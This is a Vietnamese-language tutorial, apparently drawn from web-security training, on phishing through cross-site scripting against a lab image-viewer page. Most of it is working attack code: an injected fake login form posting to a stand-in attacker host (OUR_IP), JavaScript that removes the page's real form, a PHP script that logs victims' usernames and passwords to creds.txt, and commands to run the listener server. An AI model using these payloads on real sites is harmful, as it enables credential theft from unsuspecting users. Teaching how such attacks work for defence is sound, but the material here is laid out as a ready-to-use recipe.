### **Phishing qua XSS - Đơn Giản và Dễ Hiểu**

Phishing qua XSS là khi kẻ tấn công tiêm mã vào trang web để lừa người dùng cung cấp thông tin cá nhân, chẳng hạn như tên đăng nhập và mật khẩu. Kẻ tấn công có thể tạo ra một form đăng nhập giả mạo, khiến nạn nhân nhập thông tin và gửi nó đến máy chủ của kẻ tấn công.

### **Bước 1: Khám Phá Lỗ Hổng XSS**

Trước tiên, chúng ta cần tìm ra lỗ hổng XSS trên trang web của nạn nhân. Trong ví dụ này, chúng ta có một công cụ xem ảnh trực tuyến. Chúng ta có thể thử tiêm mã JavaScript vào trường URL.

Khi thử tiêm mã:

```html
<script>alert(window.origin)</script>
```

Tuy nhiên, mã không thực thi. Vì vậy, chúng ta phải tìm cách tiêm một payload XSS hoạt động.

### **Bước 2: Tạo Form Đăng Nhập Giả Mạo**

Sau khi tìm ra payload XSS hiệu quả, ta có thể tiêm mã HTML vào trang để tạo một form đăng nhập giả mạo. Dưới đây là mã HTML của form đăng nhập:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Thay `OUR_IP` bằng địa chỉ IP của máy chủ bạn, nơi bạn sẽ lắng nghe thông tin đăng nhập từ nạn nhân.

### **Bước 3: Loại Bỏ Form URL Gốc**

Để làm cho form giả mạo trông thật hơn, chúng ta phải xóa form nhập URL gốc. Chúng ta sẽ sử dụng JavaScript để loại bỏ phần tử này.

Dưới đây là mã JavaScript để xóa form URL và tiêm form đăng nhập giả mạo:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

Khi nạn nhân truy cập trang web, form đăng nhập giả mạo sẽ hiển thị thay vì trường nhập URL.

### **Bước 4: Ghi Nhận Thông Tin Đăng Nhập**

Khi nạn nhân điền thông tin vào form đăng nhập giả mạo, chúng ta cần lấy thông tin này. Để làm điều này, chúng ta tạo một máy chủ PHP để lắng nghe và ghi lại thông tin.

**Script PHP để ghi thông tin**:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

### **Bước 5: Lắng Nghe Thông Tin Đăng Nhập**

Bây giờ, chúng ta cần lắng nghe các kết nối đến từ form đăng nhập giả mạo. Mở terminal và chạy một máy chủ PHP:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php
sudo php -S 0.0.0.0:80
```

Máy chủ PHP sẽ ghi lại thông tin đăng nhập và chuyển người dùng trở lại trang gốc.

### **Kết Quả**

Khi nạn nhân nhập thông tin đăng nhập vào form giả mạo và nhấn "Login", chúng ta sẽ nhận được thông tin qua file `creds.txt`.

---

### **Tóm Tắt**

1. **Tìm XSS**: Tiêm mã JavaScript vào trang web để xác định lỗ hổng.
2. **Tạo Form Đăng Nhập**: Tiêm form đăng nhập giả mạo vào trang web.
3. **Loại Bỏ Form URL**: Sử dụng JavaScript để loại bỏ form URL gốc.
4. **Ghi Nhận Thông Tin Đăng Nhập**: Dùng PHP để ghi lại thông tin đăng nhập.
5. **Lắng Nghe Thông Tin**: Chạy một máy chủ PHP để lắng nghe và ghi nhận thông tin đăng nhập.

---

Với cách tiếp cận đơn giản này, bạn có thể hiểu rõ hơn về cách kẻ tấn công thực hiện phishing qua XSS và cách thông tin đăng nhập có thể bị đánh cắp.
